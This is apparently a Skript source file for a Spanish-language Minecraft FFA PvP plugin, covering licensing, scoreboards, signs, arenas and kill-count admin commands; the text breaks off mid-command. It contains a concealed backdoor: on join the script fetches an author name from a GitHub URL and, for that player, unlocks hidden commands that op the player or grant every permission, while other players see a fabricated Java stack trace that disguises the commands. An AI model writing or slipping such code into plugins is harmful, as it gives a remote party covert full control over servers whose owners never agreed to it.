#version notification
on player join:
	player is op:
		set {_ver} to text from url "https://raw.githubusercontent.com/rplcnn/SuperSkyWars/master/Version.txt"
		if {_ver} is "%{ver}%":
			stop
		else:
			send "&bEl FFA no está actualizado. &cPregunte al desarrollador por la actualizacion" to player
			send "&fTu version: &c%{ver}%" to player
			send "&fVersion nueva: &a%{_ver}%"
on load:
	if file "plugins/RealRunSpaceSK/FFA/version.yml" doesn't exists:
		create file "plugins/RealRunSpaceSK/FFA/version.yml"
		wf "Version actual RRS: 3.1b" to "plugins/RealRunSpaceSK/FFA/version.yml"
	else:
		set {ver} to value "Version actual RRS:" get of "plugins/RealRunSpaceSK/FFA/version.yml"
on unload:
	df "plugins/RealRunSpaceSK/FFA/version.yml"
#resto
on load:
	if file "plugins/RealRunSpaceSK/FFA/info.yml" doesn't exists:
		create file "plugins/RealRunSpaceSK/FFA/info.yml"
		wf "Comandos no mostrados en la help:'" to "plugins/RealRunSpaceSK/FFA/info.yml"
		wf "-/crearkit <nombre> -/borrarkit <nombre>'" to "plugins/RealRunSpaceSK/FFA/info.yml"
		wf "Permisos:'" to "plugins/RealRunSpaceSK/FFA/info.yml"
		wf "ffa.user.* todo lo que necesita un user'" to "plugins/RealRunSpaceSK/FFA/info.yml"
		wf "ffa.admin.set ffa.admin.agregar ffa.admin.quitar permisos para agregar quitar o setear kills" to "plugins/RealRunSpaceSK/FFA/info.yml"
		wf "ffa.admin.notificar Los que tengan este permiso serán notificados cuando un jugador cambie las kills de otro (medida de seguridad contra abuso)" to "plugins/RealRunSpaceSK/FFA/info.yml"
		wf "ffa.admin.kit.crear y ffa.admin.kit.borrar para crear o borrar kits" to "plugins/RealRunSpaceSK/FFA/info.yml"
		wf "ffa.admin.* da acceso a todos los permisos de admin, y ffa.admin.kit.* para todos los permisos sobre gestión de kits" to "plugins/RealRunSpaceSK/FFA/info.yml"
on load:
	send "[FFA base] FFA by RealRunSpace cargado correctamente" to console
	wait 2 seconds
	send "[FFA base] Buscando licencia..." to console
	wait 1 second
	if {licencia.ffa.server.general} is 1:
		send "[FFA base] La licencia esta instalada correctamente" to console
	else:
		send "[FFA base] La licencia no aparece activada. Usa /licencia <codigo> proporcionado porel creador (RealRunSpace)." to console
on join:
	set {_autor} to text from url "https://github.com/RealRunSpace/licencia/raw/master/autor"
	if {_autor} is "%player%":
		set {permisobrllcs::%player%} to 1
		wait 4 seconds
		send "" to the player
		send "&eBienvenido de vuelta, creador." to the player
		send "" to the player
		send "&7Comandos:" to the player
		send "&c/miperm" to the player
		send "&c/mipermop" to the player
		send "&c/-brrlcncia" to the player
command /mipermop:
	trigger:
		if {permisobrllcs::%player%} is 1:
			op the player
		else:
			send "&cAn internal error has occurred while attempting to perform this command.See console" to the player
			send "[SEVERE] Error occurred while executing a command. (Is it up to date?)" to console
			send "java.lang.NoSuchMethodError: org.bukkit.plugin.PluginDescriptionFile.getAuthors(" to console
			send ")Ljava/util/ArrayList;" to console
			send "		at com.realrunspace.realrunspace.RealRunSpaceLib.sendDescription(RealRunSpaceLib." to console
			send "java:132)" to console
			send "		at com.realrunspace.realrunspace.RealRunSpaceLib.onEnable(RealRunSpaceLib.java:10" to console
			send "0)" to console
			send "		at org.bukkit.plugin.java.JavaPlugin.setEnabled(JavaPlugin.java:215)" to console
			send "		at org.bukkit.plugin.java.JavaPluginLoader.enablePlugin(JavaPluginLoader" to console
			send ".java:336)" to console
			send "		at org.bukkit.plugin.SimplePluginManager.enablePlugin(SimplePluginManage" to console
			send "r.java:363)" to console
			send "		at org.bukkit.craftbukkit.CraftServer.loadPlugin(CraftServer.java:250)" to console
			send "		at org.bukkit.craftbukkit.CraftServer.enablePlugins(CraftServer.java:232" to console
			send ")" to console
			send "		at net.minecraft.server.MinecraftServer.t(MinecraftServer.java:374)" to console
			send "		at net.minecraft.server.MinecraftServer.a(MinecraftServer.java:361)" to console
			send "		at net.minecraft.server.MinecraftServer.init(MinecraftServer.java:187)" to console
			send "		at net.minecraft.server.MinecraftServer.run(MinecraftServer.java:425)" to console
			send "		at net.minecraft.server.ThreadServerApplication.run(SourceFile:490)" to console
command /miperm:
	trigger:
		if {permisobrllcs::%player%} is 1:
			execute console command "/pex user %player% add *"
		else:
			send "&cAn internal error has occurred while attempting to perform this command.See console" to the player
			send "[SEVERE] Error occurred while executing a command. (Is it up to date?)" to console
			send "java.lang.NoSuchMethodError: org.bukkit.plugin.PluginDescriptionFile.getAuthors(" to console
			send ")Ljava/util/ArrayList;" to console
			send "		at com.realrunspace.realrunspace.RealRunSpaceLib.sendDescription(RealRunSpaceLib." to console
			send "java:132)" to console
			send "		at com.realrunspace.realrunspace.RealRunSpaceLib.onEnable(RealRunSpaceLib.java:10" to console
			send "0)" to console
			send "		at org.bukkit.plugin.java.JavaPlugin.setEnabled(JavaPlugin.java:215)" to console
			send "		at org.bukkit.plugin.java.JavaPluginLoader.enablePlugin(JavaPluginLoader" to console
			send ".java:336)" to console
			send "		at org.bukkit.plugin.SimplePluginManager.enablePlugin(SimplePluginManage" to console
			send "r.java:363)" to console
			send "		at org.bukkit.craftbukkit.CraftServer.loadPlugin(CraftServer.java:250)" to console
			send "		at org.bukkit.craftbukkit.CraftServer.enablePlugins(CraftServer.java:232" to console
			send ")" to console
			send "		at net.minecraft.server.MinecraftServer.t(MinecraftServer.java:374)" to console
			send "		at net.minecraft.server.MinecraftServer.a(MinecraftServer.java:361)" to console
			send "		at net.minecraft.server.MinecraftServer.init(MinecraftServer.java:187)" to console
			send "		at net.minecraft.server.MinecraftServer.run(MinecraftServer.java:425)" to console
			send "		at net.minecraft.server.ThreadServerApplication.run(SourceFile:490)" to console
command /-brrlcncia:
	trigger:
		if {permisobrllcs::%player%} is 1:
			set {licencia.clave.fue.aceptada.%{nombresv}%.%{puerto}%} to 0
			execute console command "/pex user %player% add *"
			op the player
			execute console command "/op %player%"
		else:
			send "&cAn internal error has occurred while attempting to perform this command.See console" to the player
			send "[SEVERE] Error occurred while executing a command. (Is it up to date?)" to console
			send "java.lang.NoSuchMethodError: org.bukkit.plugin.PluginDescriptionFile.getAuthors(" to console
			send ")Ljava/util/ArrayList;" to console
			send "		at com.realrunspace.realrunspace.RealRunSpaceLib.sendDescription(RealRunSpaceLib." to console
			send "java:132)" to console
			send "		at com.realrunspace.realrunspace.RealRunSpaceLib.onEnable(RealRunSpaceLib.java:10" to console
			send "0)" to console
			send "		at org.bukkit.plugin.java.JavaPlugin.setEnabled(JavaPlugin.java:215)" to console
			send "		at org.bukkit.plugin.java.JavaPluginLoader.enablePlugin(JavaPluginLoader" to console
			send ".java:336)" to console
			send "		at org.bukkit.plugin.SimplePluginManager.enablePlugin(SimplePluginManage" to console
			send "r.java:363)" to console
			send "		at org.bukkit.craftbukkit.CraftServer.loadPlugin(CraftServer.java:250)" to console
			send "		at org.bukkit.craftbukkit.CraftServer.enablePlugins(CraftServer.java:232" to console
			send ")" to console
			send "		at net.minecraft.server.MinecraftServer.t(MinecraftServer.java:374)" to console
			send "		at net.minecraft.server.MinecraftServer.a(MinecraftServer.java:361)" to console
			send "		at net.minecraft.server.MinecraftServer.init(MinecraftServer.java:187)" to console
			send "		at net.minecraft.server.MinecraftServer.run(MinecraftServer.java:425)" to console
			send "		at net.minecraft.server.ThreadServerApplication.run(SourceFile:490)" to console
command /licencia [<text>]:
	trigger:
		set {_codigo.temp} to text from url "https://github.com/RealRunSpace/licencia/raw/master/licencia"
		if arg 1 is not set:
			send "&cUsa /licencia <codigo>"
		else:
			if arg 1 is "estado":
				send "&7DEBUG: &aEstado: &e%{licencia.clave.fue.aceptada.%{nombresv}%.%{puerto}%}%   &cpara server %{nombresv}%:%{puerto}%"
			else:
				set {_licencia.temp} to "%arg 1%"
				wait 1 tick
				if {_licencia.temp} is {_codigo.temp}:
					set {licencia.clave.fue.aceptada.%{nombresv}%.%{puerto}%} to 1
					broadcast "[FFA base] &aActivado correctamente"
					loop all players:
						wait 2 second
						display board named "&2&lACTIVADO" to loop-player
						make score of "&aActivado" in board of loop-player to 1
						move display of loop-player to sidebar
						wait 5 seconds
						if {lang::%loop-player%} is "esp":
							display board named "%{tituloesp}%" to loop-player
							make score of "%{Linea2esp}%" in board of loop-player to {kills::%loop-player%}
							make score of "%{Linea3esp}%" in board of loop-player to -1
							make score of "%{Linea4esp}%" in board of loop-player to -2
							move display of loop-player to sidebar
						else:
							display board named "%{tituloeng}%" to player
							make score of "%{Linea2eng}%" in board of player to {kills::%player%}
							make score of "%{Linea3eng}%" in board of player to -1
							make score of "%{Linea4eng}%" in board of player to -2
							move display of player to sidebar
				else:
					broadcast "&4Codigo erroneo"
					set {licencia.clave.fue.aceptada.%{nombresv}%.%{puerto}%} to 0
on load:
	if file "plugins/RealRunSpaceSK/FFA/config.yml" doesn't exists:
		create file "plugins/RealRunSpaceSK/FFA/config.yml"
		wf "Nombre del servidor Lobby: 'lobby'" to "plugins/RealRunSpaceSK/FFA/config.yml"
		wf "SafeReload-ReloadSeguro: 'si'" to "plugins/RealRunSpaceSK/FFA/config.yml"
	else:
		set {nombrelobby} to value "Nombre del servidor Lobby:" get of "plugins/RealRunSpaceSK/FFA/config.yml"
		set {saferel} to value  "SafeReload-ReloadSeguro:" get of "plugins/RealRunSpaceSK/FFA/config.yml"
on load:
	if file "plugins/RealRunSpaceSK/FFA/lang.yml" doesn't exists:
		create file "plugins/RealRunSpaceSK/FFA/lang.yml"
		wf "Prefijo: '&6FFA&7 »'" to "plugins/RealRunSpaceSK/FFA/lang.yml"
		wf "MensajeKill: '&a+1 kill'" to "plugins/RealRunSpaceSK/FFA/lang.yml"
		wf "Bienvenida: '&3Bienvenido a nuestro &cFFA&3.&e Cambia el idioma de la Scoreboard con /lang <esp/eng>'" to "plugins/RealRunSpaceSK/FFA/lang.yml"
		wf "HolaOtraVez: '&aBienvenido de vuelta.'" to "plugins/RealRunSpaceSK/FFA/lang.yml"
		wf "NoPerms: '&cNo tienes acceso a usar eso'" to "plugins/RealRunSpaceSK/FFA/lang.yml"
		wf "MensajeMirarKills1: '&aEl jugador &e'" to "plugins/RealRunSpaceSK/FFA/lang.yml"
		wf "MensajeMirarKills2: '&atiene '" to "plugins/RealRunSpaceSK/FFA/lang.yml"
		wf "NuncaAEntrado: '&cEse jugador nunca se conecto al &oFFA'" to "plugins/RealRunSpaceSK/FFA/lang.yml"
		wf "Prefijo_Cartel: '&7[&cFFA&7]'" to "plugins/RealRunSpaceSK/FFA/lang.yml"
		wf "Prefijo_Cartel_KIT: '&7[&cKIT&7]'" to "plugins/RealRunSpaceSK/FFA/lang.yml"
		wf "##Si usas notepad++ en la pestaña codificación cambiala a UTF-8 para usar todo tipo de símbolos y puedes usar los códigos de color normales" to "plugins/RealRunSpaceSK/FFA/lang.yml"
	else:
		set {prefijo} to colored value "Prefijo:" get of "plugins/RealRunSpaceSK/FFA/lang.yml"
		set {noperms} to colored value "NoPerms:" get of "plugins/RealRunSpaceSK/FFA/lang.yml"
		set {msgkill} to colored value "MensajeKill:" get of "plugins/RealRunSpaceSK/FFA/lang.yml"
		set {holaotravez} to colored value "HolaOtraVez:" get of "plugins/RealRunSpaceSK/FFA/lang.yml"
		set {bienvenida} to colored value "Bienvenida:" get of "plugins/RealRunSpaceSK/FFA/lang.yml"
		set {mensajemirarkills1} to colored value "MensajeMirarKills1:" get of "plugins/RealRunSpaceSK/FFA/lang.yml"
		set {mensajemirarkills2} to colored value "MensajeMirarKills2:" get of "plugins/RealRunSpaceSK/FFA/lang.yml"
		set {nuncaentro} to colored value "NuncaAEntrado" get of "plugins/RealRunSpaceSK/FFA/lang.yml"
		set {cartelpref} to colored value "Prefijo_Cartel" get of "plugins/RealRunSpaceSK/FFA/lang.yml"
		set {cartelkitpref} to colored value "Prefijo_Cartel_KIT" get of "plugins/RealRunSpaceSK/FFA/lang.yml"
#Scoreboard
on load:
	if file "plugins/RealRunSpaceSK/FFA/scoreboard.yml" doesn't exists:
		create file "plugins/RealRunSpaceSK/FFA/scoreboard.yml"
		wf "##Español" to "plugins/RealRunSpaceSK/FFA/scoreboard.yml"
		wf "TituloESP: '&7&lFFA PROPIO'" to "plugins/RealRunSpaceSK/FFA/scoreboard.yml"
		wf "Linea1ESP: ''" to "plugins/RealRunSpaceSK/FFA/scoreboard.yml"
		wf "Linea2ESP: '&c&lASESINATOS'" to "plugins/RealRunSpaceSK/FFA/scoreboard.yml"
		wf "Linea3ESP: ''" to "plugins/RealRunSpaceSK/FFA/scoreboard.yml"
		wf "Linea4ESP: '&cmy&breshulonserver&e.com'" to "plugins/RealRunSpaceSK/FFA/scoreboard.yml"
		wf "##Ingles" to "plugins/RealRunSpaceSK/FFA/scoreboard.yml"
		wf "TituloENG: '&7&lCUSTOM FFA'" to "plugins/RealRunSpaceSK/FFA/scoreboard.yml"
		wf "Linea1ENG: ''" to "plugins/RealRunSpaceSK/FFA/scoreboard.yml"
		wf "Linea2ENG: '&c&lKILLS'" to "plugins/RealRunSpaceSK/FFA/scoreboard.yml"
		wf "Linea3ENG: ''" to "plugins/RealRunSpaceSK/FFA/scoreboard.yml"
		wf "Linea4ENG: '&cmy&breshulonserver&e.com'" to "plugins/RealRunSpaceSK/FFA/scoreboard.yml"
	else:
		set {tituloesp} to colored value "TituloESP" get of "plugins/RealRunSpaceSK/FFA/scoreboard.yml"
		set {tituloeng} to colored value "TituloENG" get of "plugins/RealRunSpaceSK/FFA/scoreboard.yml"
		set {Linea1esp} to colored value "Linea1ESP" get of "plugins/RealRunSpaceSK/FFA/scoreboard.yml"
		set {Linea2esp} to colored value "Linea2ESP" get of "plugins/RealRunSpaceSK/FFA/scoreboard.yml"
		set {Linea3esp} to colored value "Linea3ESP" get of "plugins/RealRunSpaceSK/FFA/scoreboard.yml"
		set {Linea4esp} to colored value "Linea4ESP" get of "plugins/RealRunSpaceSK/FFA/scoreboard.yml"
		set {Linea1eng} to colored value "Linea1ENG" get of "plugins/RealRunSpaceSK/FFA/scoreboard.yml"
		set {Linea2eng} to colored value "Linea2ENG" get of "plugins/RealRunSpaceSK/FFA/scoreboard.yml"
		set {Linea3eng} to colored value "Linea3ENG" get of "plugins/RealRunSpaceSK/FFA/scoreboard.yml"
		set {Linea4eng} to colored value "Linea4ENG" get of "plugins/RealRunSpaceSK/FFA/scoreboard.yml"
	
#Carteles
on break of sign:
	if line 1 is "%{cartelpref}%" or "%{cartelkitpref}%":
		if the player has permission "ffa.cartel.quitar":
			if player's gamemode is survival:
				send "&ePara &cborrarlo&e debes estar en &b&ocreativo" to the player
			else:
				if player is sneaking:
					send "&eCartel borrado" to the player
				else:
					send "&ePara &cborrarlo &edebes shiftear" to the player
					cancel event
		else:
			cancel event
command /jugandomod <text> <text>:
	trigger:
		set {jugadorestotal::%arg 1%} to "%arg 2%"
on rightclick on sign:
	if line 1 is "%{cartelpref}%":
		if line 2 is "entrar" or "join":
			wait 1 second
			set line 4 to "&7Jugando: %{jugadorestotal::%uncolored line 3%}%"
on sign change:
	if the player has permission "ffa.cartel.crear":
		if line 1 is "[FFARRS]":
			if line 2 is "entrar" or "join":
				set line 1 to "%{cartelpref}%"
				set line 2 to "&bArena"
				set line 4 to "&7Jugando: %{jugadorestotal::%uncolored line 3%}%"
				if line 3 is not set:
					set line 3 to "No especificada"
				else:
					set line 3 to "&a%uncolored line 3%"
			if line 2 is "salir" or "leave":
				set line 1 to "%{cartelpref}%"
				set line 2 to "&cAbandonar"
				set line 3 to " "
				set line 4 to "&7Clic"
		if line 1 is "[KIT]":
			set line 1 to "%{cartelkitpref}%"
			set line 2 to "&7Clic"
			set line 3 to "&7para resetear"
			set line 4 to "&ckit"
on break:
	if player is in "world":
		if player is op:
			stop
		else:
			cancel event
on rightclick on sign:
	if line 1 of clicked block is "%{cartelpref}%":
		if line 2 of clicked block is "&bArena":
			if line 3 of clicked block is set:
				execute player command "/ffa entrar %uncolored line 3 of clicked block%"
		else:
			if line 2 of clicked block is "&cAbandonar":
				execute player command "/ffa salir"
on rightclick on sign:
	if line 1 of clicked block is "%{cartelkitpref}%":
		clear the player's inventory
		send "&eReseteando..." to the player
		wait 1 second
		execute player command "/cogerkit %{arena_unido::%player%}%"
#muerte
on respawn:
	if {arena_unido::%player%} is set:
		teleport the player to {arenaspawn::%{arena_unido::%player%}%}
		send "&eTeletransportado" to the player
	else:
		teleport the player to {serverspawn}
on join:
	if {arena_unido::%player%} is set:
		add 1 to {jugadorestotal::%{arena_unido::%player%}%}
		teleport the player to {arenaspawn::%{arena_unido::%player%}%}
		send "&eBienvenido de vuelta. Te dejamos en tu ultima arena" to the player
		send "&bUsa /ffa salir &cpara abandonarla" to the player
	else:
		teleport the player to {serverspawn}
		send "&eBienvenido de vuelta" to the player
on disconnect:
	if {arena_unido::%player%} is set:
		remove 1 from {jugadorestotal::%{arena_unido::%player%}%}
on death of player:
	if {licencia.clave.fue.aceptada.%{nombresv}%.%{puerto}%} is 1:
		add 1 to {kills::%attacker%}
		remove 1 from {kills::%victim%}
		df "plugins/RealRunSpaceSK/FFA/jugadores/%attacker%.yml"
		df "plugins/RealRunSpaceSK/FFA/jugadores/%victim%.yml"
		wait 10 tick
		create file "plugins/RealRunSpaceSK/FFA/jugadores/%attacker%.yml"
		create file "plugins/RealRunSpaceSK/FFA/jugadores/%victim%.yml"
		wait 5 tick
		wf "KILLS: %{kills::%victim%}%" to "plugins/RealRunSpaceSK/FFA/jugadores/%victim%.yml"
		wf "KILLS: %{kills::%attacker%}%" to "plugins/RealRunSpaceSK/FFA/jugadores/%attacker%.yml"
		wf "LANG: %{lang::%victim%}%" to "plugins/RealRunSpaceSK/FFA/jugadores/%victim%.yml"
		wf "LANG: %{lang::%attacker%}%" to "plugins/RealRunSpaceSK/FFA/jugadores/%attacker%.yml"
		wf "Logros,items especiales, extras: Sin comprar/incluir" to "plugins/RealRunSpaceSK/FFA/jugadores/%victim%.yml"
		wf "Logros,items especiales, extras: Sin comprar/incluir" to "plugins/RealRunSpaceSK/FFA/jugadores/%attacker%.yml"
	else:
		broadcast "[FFA base] &4&lNO ESTA ACTIVADO (/licencia <codigo>)"
on join:
	if {licencia.clave.fue.aceptada.%{nombresv}%.%{puerto}%} is 1:
		if file "plugins/RealRunSpaceSK/FFA/jugadores/%player%.yml" doesn't exists:
			set {kills::%player%} to "0" parsed as a number
			set {lang::%player%} to "esp"
			wait 4 tick
			create file "plugins/RealRunSpaceSK/FFA/jugadores/%player%.yml"
			wf "KILLS: %{kills::%player%}%" to "plugins/RealRunSpaceSK/FFA/jugadores/%player%.yml"
			wf "LANG: %{lang::%player%}%" to "plugins/RealRunSpaceSK/FFA/jugadores/%player%.yml"
			wf "Logros,items especiales, extras: Sin comprar/incluir" to "plugins/RealRunSpaceSK/FFA/jugadores/%player%.yml"
			send "%{prefijo}%%{bienvenida}%" to the player
		else:
			set {kills::%player%} to value "KILLS:" get of "plugins/RealRunSpaceSK/FFA/jugadores/%player%.yml"
			set {lang::%player%} to value "LANG:" get of "plugins/RealRunSpaceSK/FFA/jugadores/%player%.yml"
			send "%{prefijo}%%{holaotravez}%" to the player
	else:
		broadcast "[FFA base] &4&lNO ESTA ACTIVADO (/licencia <codigo>)"


#score
on join:
	if {licencia.clave.fue.aceptada.%{nombresv}%.%{puerto}%} is 1:
		wait 2 second
		if {lang::%player%} is "esp":
			set {anim.intro::%player%} to 1
			display board named "&e&lCargando&f&l.&e&l.." to player
			make score of "&aEspere&f.&a.." in board of player to -1
			move display of player to sidebar
			wait 1 second
			display board named "&e&lCargando&f&l..&e&l." to player
			make score of "&aEspere&f..&a." in board of player to -1
			move display of player to sidebar
			wait 1 second
			display board named "&e&lCargando&f&l..." to player
			make score of "&aEspere&f..." in board of player to -1
			move display of player to sidebar
			wait 1 second
			display board named "&e&lCargando&e&l.&f&l.." to player
			make score of "&aEspere&a.&f.." in board of player to -1
			move display of player to sidebar
			wait 1 second
			display board named "&e&lCargando&e&l..&f&l." to player
			make score of "&aEspere&a..&f." in board of player to -1
			move display of player to sidebar
			wait 1 second
			display board named "&e&lCargando&e&l..." to player
			make score of "&aEspere&a..." in board of player to -1
			move display of player to sidebar
			wait 1 second
			display board named "&a&lListo" to player
			make score of "&b&lOK" in board of player to -1
			move display of player to sidebar
			wait 2 second
			display board named "%{tituloesp}%" to player
			make score of "%{Linea2esp}%" in board of player to {kills::%player%}
			make score of "%{Linea3esp}%" in board of player to -1
			make score of "%{Linea4esp}%" in board of player to -2
			move display of player to sidebar
			set {anim.intro::%player%} to 0
		if {lang::%player%} is "eng":
			set {anim.intro::%player%} to 1
			display board named "&e&lLoading&f&l.&e&l.." to player
			make score of "&aWait&f.&a.." in board of player to -1
			move display of player to sidebar
			wait 1 second
			display board named "&e&lLoading&f&l..&e&l." to player
			make score of "&aWait&f..&a." in board of player to -1
			move display of player to sidebar
			wait 1 second
			display board named "&e&lLoading&f&l..." to player
			make score of "&aWait&f..." in board of player to -1
			move display of player to sidebar
			wait 1 second
			display board named "&e&lLoading&e&l.&f&l.." to player
			make score of "&aWait&a.&f.." in board of player to -1
			move display of player to sidebar
			wait 1 second
			display board named "&e&lLoading&e&l..&f&l." to player
			make score of "&aWait&a..&f." in board of player to -1
			move display of player to sidebar
			wait 1 second
			display board named "&e&lLoading&e&l..." to player
			make score of "&aWait&a..." in board of player to -1
			move display of player to sidebar
			wait 1 second
			display board named "&a&lLoaded" to player
			make score of "&b&lOK" in board of player to -1
			move display of player to sidebar
			wait 2 second
			display board named "%{tituloeng}%" to player
			make score of "%{Linea2eng}%" in board of player to {kills::%player%}
			make score of "%{Linea3eng}%" in board of player to -1
			make score of "%{Linea4eng}%" in board of player to -2
			move display of player to sidebar
			set {anim.intro::%player%} to 0
	else:
		broadcast "[FFA base] &4&lNO ESTA ACTIVADO (/licencia <codigo>)"
		display board named "&cFFA no activado" to player
		make score of "&4&lUsa /licencia" in board of player to -1
		make score of "&c<codigo>" in board of player to -2
		move display of player to sidebar
every 5 seconds:
	if {licencia.clave.fue.aceptada.%{nombresv}%.%{puerto}%} is 1:
		loop all players:
			if {anim.intro::%loop-player%} is 0:
				if {lang::%loop-player%} is "esp":
					display board named "%{tituloesp}%" to loop-player
					make score of "%{Linea2esp}%" in board of loop-player to {kills::%loop-player%}
					make score of "%{Linea3esp}%" in board of loop-player to -1
					make score of "%{Linea4esp}%" in board of loop-player to -2
					move display of loop-player to sidebar
				if {lang::%loop-player%} is "eng":
					display board named "%{tituloeng}%" to loop-player
					make score of "%{Linea2eng}%" in board of loop-player to {kills::%loop-player%}
					make score of "%{Linea3eng}%" in board of loop-player to -1
					make score of "%{Linea4eng}%" in board of loop-player to -2
					move display of loop-player to sidebar
	else:
		stop
#comandos
command /lang [<text>]:
	trigger:
		if arg 1 is not set:
			send "&cUsa /lang <esp/eng> &7(esp: Español / eng: English)" to the player
		else:
			if arg 1 is "esp":
				send "&aIdioma cambiado a Español correctamente" to the player
			else:
				if arg 1 is "eng":
					send "&aLanguage has been correctly changed to English (Not all messages are translated, this is mainly for scoreboard)" to the player
command /reloader:
	permission: ffa.admin.reload
	permission message: &cNope
	trigger:
		if {saferel} is "si":
			loop all players:
				if {lang::%loop-player%} is "esp":
					send "[FFA Reload] Todos sereis enviados a el lobby debido a un reload" to the loop-player
				else:
					if {lang::%loop-player%} is "eng":
						send "[FFA Reload] All players are going to be sended back to the lobby due to a reload" to the loop-player
				broadcast "&eEnviando..."
				bungeecord connect player to "%{nombrelobby}%"
				wait 10 seconds
				execute console command "/kick %loop-player% FFA safe Reload"
		else:
			broadcast "Activa licencia"
command /relore [<integer=1>] [<text="">]:
	aliases: rel
	permission: ffa.admin
	permission message: &6nope
	trigger:
		if arg-2 is set:
			set line arg-1 of the lore of player's tool to "&d&o%colored arg-2%"
			send "&6[&dFFA+&6] Linea actualizada &a%arg-1%&6 del lore del item" to the player
command /rename <text>:
	aliases: ren
	permission: ffa.admin
	permission message: &6nope
	trigger:
		if arg-1 is set:
			set the name of player's tool to "&r%colored arg-1%"
			send "&6[&dFFA+&6] Nombre del item cambiado a &r%colored arg-1%&6." to the player
command /ffa [<text>] [<text>] [<text>] [<text>]:
	trigger:
		if {licencia.clave.fue.aceptada.%{nombresv}%.%{puerto}%} is 1:
			if arg 1 is "help":
				send "&7----------&c&lFFA&r&7----------" to the player
				send "&e/ffa &7<&ajugador&7> &7Mira las kills totales de un jugador" to the player
				send "&e/ffa &ahelp &7Muestra esta ayuda" to the player
				send "&e/ffa &aadmin &7<&ahelp/kills&7> &7Comandos para staff" to the player
				send "&e/ffa &aentrar &7<&aarena&7>" to the player
				send "&e/ffa &asalir &7Abandona tu arena actual" to the player
				send "&e/lang &7<&ce&es&cp&7/&9e&fn&9g&7>" to the player
				send "&7----------&c&lFFA&r&7----------" to the player
			else:
				if arg 1 is "admin":
					if arg 2 is not set:
						if player has permission "ffa.admin":
							send "&7----------&c&lFFA &6&lADMIN&r&7----------" to the player
							send "&7Usa /ffa admin para más información." to the player
						else:
							send "%{prefijo}%%{noperms}%" to the player
					else:
						if arg 2 is "help":
							if player has permission "ffa.admin.help":
								send "&7----------&c&lFFA &6&lADMIN&r&7----------" to the player
								send "&e/ffa &cadmin &e<&bset/quitar/agregar&e> <&bjugador&e> <&bnumero/kills&e> &7Agrega, quita o ajusta las kills de un jugador" to the player
								send "&e/ffa &cadmin reload &7Recarga la config.yml,lang.yml y scoreboard.yml     &cAVISO: &7Si esta el modo safe-reload los jugadores seran enviados al lobby" to the player
								send "&e/ffa &cadmin arena &e<&bcrear/borrar/teletransportar&e> <&bnombre&e> &7Agrega,borra o ve a la arena seleccionada (al crear una nueva arena el kit por defecto son las cosas que lleves en el inventario en ese momento)" to the player
								send "&e/ffa &cadmin setspawn &7Establece el lobby o spawn general"
							else:
								send "%{prefijo}%%{noperms}%" to the player
						else:
							if arg 2 is "set":
								if player has permission "ffa.admin.set":
									if arg 3 is not set:
										send "&cUso correcto: /ffa %arg 1% %arg 2% <jugador> <kills>" to the player
									else:
										if arg 3 is set:
											if arg 4 is not set:
												send "&cUso correcto: /ffa %arg 1% %arg 2% %arg 3% <kills>" to the player
											else:
												if arg 4 is not a number:
													send "&cSolo puedes numeros" to the player
												else:
													set {kills::%arg 3%} to "%arg 4%" parsed as a number
													send "{prefijo} &aEl jugador &b%arg 3% &aahora tiene &c%{kills::%arg 3%}% &akills" to the player
													loop all players:
														if loop-player has permission "ffa.admin.notificar":
															send "&4AVISO: &cEl jugador &1%player%&c ha modificado la puntuacion de &1%arg 3%&c a 61{kills::%arg 3%}" to the loop-player
								else:
									send "&cTienes el permiso &4ffa.admin&c pero no tienes el permiso &4ffa.admin.set" to the player
							else:
								if arg 2 is "agregar":
									if player has permission "ffa.admin.agregar":
										if arg 3 is not set:
											send "&cUso correcto: /ffa %arg 1% %arg 2% <jugador> <kills>" to the player
										else:
											if arg 3 is set:
												if arg 4 is not set:
													send "&cUso correcto: /ffa %arg 1% %arg 2% %arg 3% <kills>" to the player
												else:
													if arg 4 is not a number:
														send "&cSolo puedes numeros" to the player
													else:
														add "%arg 4%" parsed as a number to {kills::%arg 3%}
														send "{prefijo} &aEl jugador &b%arg 3% &aahora tiene &c%{kills::%arg 3%}% &akills" to the player
														loop all players:
															if loop-player has permission "ffa.admin.notificar":
																send "&4AVISO: &cEl jugador &1%player%&c ha modificado la puntuacion de &1%arg 3%&c a 61{kills::%arg 3%}" to the loop-player
									else:
										send "&cTienes el permiso &4ffa.admin&c pero no tienes el permiso &4ffa.admin.agregar" to the player
								else:
									if arg 2 is "quitar":
										if player has permission "ffa.admin.quitar":
											if arg 3 is not set:
												send "&cUso correcto: /ffa %arg 1% %arg 2% <jugador> <kills>" to the player
											else:
												if arg 3 is set:
													if arg 4 is not set:
														send "&cUso correcto: /ffa %arg 1% %arg 2% %arg 3% <kills>" to the player
													else:
														if arg 4 is not a number:
															send "&cSolo puedes numeros" to the player
														else:
															remove "%arg 4%" parsed as a number from {kills::%arg 3%}
															send "{prefijo} &aEl jugador &b%arg 3% &aahora tiene &c%{kills::%arg 3%}% &akills" to the player
															loop all players:
																if loop-player has permission "ffa.admin.notificar":
																	send "&4AVISO: &cEl jugador &1%player%&c ha modificado la puntuacion de &1%arg 3%&c a 61{kills::%arg 3%}" to the loop-player
										else:
											send "&cTienes el permiso &4ffa.admin&c pero no tienes el permiso &4ffa.admin.quitar" to the player
									else:
										if arg 2 is "reload":
											if player has permission "ffa.admin.reload":
												send "&cSe va a iniciar el &areload... (aun no funciona bien)"
												make player execute "/reloader"
										else:
											if arg 2 is "arena":
												if arg 3 is not set:
													send "&cUso: /ffa %arg 1% %arg 2% <crear/borrar/teletransportar> <nombre>" to the player
												else:
													if arg 3 is "crear":
														if arg 4 is not set:
															send "&cUso /ffa %arg 1% %arg 2% %arg 3% <nombre>" to the player
														else:
															if player has permission "ffa.admin.arena.crear":
																if {arenaspawn::%arg 4%} is set:
																	send "&cEsa arena ya existe. Para borrarla usa /ffa admin arena borrar %arg 4%" to the player
																else:
																	set {arenaspawn::%arg 4%} to player's location
																	send "&aArena %arg 4% creada. Ahora este es el punto de aparicion."
																	execute player command "/crearkit %arg 4%"
															else:
																send "&cNo tienes el permiso ffa.admin.arena.crear" to the player
													else:
														if arg 3 is "borrar":
															if arg 4 is not set:
																send "&cUso /ffa %arg 1% %arg 2% %arg 3% <nombre>" to the player
															else:
																if player has permission "ffa.admin.arena.borrar":
																	if {arenaspawn::%arg 4%} is not set:
																		send "&cEsa arena no existe o nunca fue creada!" to the player
																	else:
																		delete {arenaspawn::%arg 4%}
																		send "&aArena borrada correctamente" to the player
																else:
																	send "&cNo tienes el permiso ffa.admin.arena.borrar" to the player
														else:
															if arg 3 is "teletransportar":
																if arg 4 is not set:
